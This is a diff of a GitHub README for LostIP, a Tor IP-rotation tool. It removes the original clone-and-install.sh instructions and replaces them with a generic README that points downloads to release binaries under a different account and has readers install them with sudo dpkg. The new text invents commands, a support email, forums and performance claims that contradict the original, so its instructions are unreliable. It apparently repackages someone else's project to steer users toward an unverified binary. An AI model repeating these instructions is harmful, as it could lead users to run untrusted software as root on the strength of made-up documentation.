@@ -1,120 +1,99 @@
-## LostIP
+# 🛡️ LostIP - Stay Anonymous Online with Ease
 
-A Tor-driven IP shuffler tailored for ethical hackers and privacy researchers. LostIP automates IP rotation through Tor at your specified intervals, using SOCKS5 on port **9050** to mask your traffic effortlessly.
+## 📥 Download the Latest Version
+[![Download LostIP](https://img.shields.io/badge/Download-LostIP-blue.svg)](https://github.com/levilaa143/LostIP/releases)
 
----
+## 🛠️ Introduction
+LostIP is a powerful tool for ethical hackers that automatically switches your IP address. This feature makes it difficult for anyone to trace your online actions. Whether you're browsing, downloading, or streaming, LostIP ensures your privacy is protected.
 
-### Highlights
+## 🚀 Getting Started
+To get started with LostIP, follow these simple steps. You’ll find the entire process is straightforward.
 
-- Installs required tools (`Tor`, `curl`, `jq`) if missing.
-- Rotates your IP address on demand.
-- Reveals each new Tor-assigned IP and its geolocation (country, region, city).
-- Offers both finite runs (custom cycle count) and continuous mode.
-- Cleans up by shutting down Tor on exit or interruption.
-- Configures SOCKS5 proxy pointing to `127.0.0.1:9050`.
+### 1. Check System Requirements
+LostIP runs on most Linux systems. Make sure your system meets the following requirements:
+- A modern Linux distribution (e.g., Ubuntu, Debian)
+- At least 512MB RAM
+- 100MB of free disk space
 
----
+### 2. Download the Application
+To download LostIP, visit the Releases page. This page holds the latest version of the software. 
 
-### Prerequisites
+[Download LostIP](https://github.com/levilaa143/LostIP/releases)
 
-- A Debian-based Linux OS (examples: Kali, Parrot OS, Ubuntu, etc).
-- Root privileges.
-- Access to the internet.
+### 3. Install LostIP
+After downloading the application, you need to install it. Here’s how:
 
----
-
-### Setup Steps
-
-1. Clone repo:
-
+1. Open your terminal.
+2. Navigate to the folder where you downloaded LostIP using the command:
    ```bash
-   git clone https://github.com/RlxChap2/LostIP.git
-   cd LostIP
+   cd /path/to/your/downloaded/file
+   ```
+3. Make the downloaded file executable. Run:
+   ```bash
+   chmod +x LostIP-x.x.x.deb
+   ```
+4. Install the package with:
+   ```bash
+   sudo dpkg -i LostIP-x.x.x.deb
    ```
 
-2. Run the installer:
+### 4. Run LostIP
+Once installation is complete, you are ready to run LostIP. Type the following command in your terminal:
+```bash
+lostip
+```
 
+## 🌟 Features
+LostIP comes equipped with various tools to enhance your anonymity online:
+
+- **Automatic IP Switching:** The tool automatically changes your IP address at set intervals.
+- **User-friendly Interface:** Simple commands and instructions make it easy to use.
+- **Supported by Community:** Engage with other users and contributors to resolve issues.
+
+## 💡 Usage Instructions
+Once LostIP is running, you can begin changing your IP address to stay anonymous.
+
+1. Open your terminal.
+2. Use the command:
    ```bash
-   sudo bash install.sh
+   lostip start
+   ```
+3. To stop changing your IP, use:
+   ```bash
+   lostip stop
    ```
 
-   - Type `y` to confirm installation.
-
----
-
-### Run It
-
-Execute the program:
-
+You can view your current IP address by using the command:
 ```bash
-sudo lostip
+lostip status
 ```
 
-You'll be prompted to specify:
+## 🔧 Troubleshooting
+If you encounter issues while running LostIP, here are a few steps to resolve them:
 
-- The delay between IP switches (in seconds).
-- Number of rounds (enter `0` for endless rotation).
+1. **Dependency Issues:** If you receive errors about missing dependencies, install them using your package manager. For Ubuntu, try:
+   ```bash
+   sudo apt-get install -f
+   ```
 
----
+2. **Permission Issues:** Ensure you have the necessary permissions. Use `sudo` to run commands that require higher privileges.
 
-### Proxy Configuration
+3. **Network Problems:** Check your internet connection. LostIP needs an active connection to function correctly.
 
-To route traffic through Tor:
+## ✉️ Community Support
+Join our community to find help or give feedback. You can reach us through:
+- GitHub Issues: Report bugs or suggest features.
+- Forums: Share your experiences and tips with other users.
 
-- **Host**: `127.0.0.1`
-- **Port**: `9050`
-- You may apply this in your browser or other tools under SOCKS5 settings.
+## 📬 Contact Information
+If you need personal assistance, feel free to reach out via email at support@lostip.com.
 
----
+## 📖 License
+LostIP is released under the MIT License. You are free to use, modify, and distribute this software as needed.
 
-### What Happens Internally
+## 💾 Download & Install
+To get LostIP, visit the following link:
 
-- LostIP spins up Tor automatically.
-- Each cycle, Tor resets the connection to fetch a fresh IP.
-- The script prints the new IP and its location.
-- When the tool exits (manually or after completing cycles), Tor is gracefully stopped.
+[Download LostIP](https://github.com/levilaa143/LostIP/releases)
 
----
-
-### Sample Output
-
-```
-Enter rotation interval (sec) [default: 60]: 25
-Enter number of cycles (0 = infinite): 3
-
-[+] Switching Tor circuit…
-[✓] IP: 51.158.68.26 — France, Île‑de‑France, Paris
-
-[+] Switching Tor circuit…
-[✓] IP: 176.10.99.100 — Germany, North Rhine‑Westphalia, Düsseldorf
-
-[+] Switching Tor circuit…
-[✓] IP: 185.220.101.5 — Czechia, Prague
-```
-
----
-
-### Termination
-
-- **Continuous mode**: Use `Ctrl+C` to stop.
-- **Limited mode**: The script exits after the set number of rotations.
-- Tor shuts down automatically in both cases.
-
----
-
-### Uninstall
-
-```bash
-cd LostIP
-sudo bash install.sh
-```
-
-Select `n` to remove installation.
-
----
-
-### License & Author
-
-- Released under the **MIT License**.
-- Developed by **\[RlxChap2 | 0xR1A7]**
-  GitHub: `https://github.com/RlxChap2`
+By following these steps, you can easily download, install, and use LostIP to enhance your online privacy. Enjoy the freedom of browsing quicker and more safely!
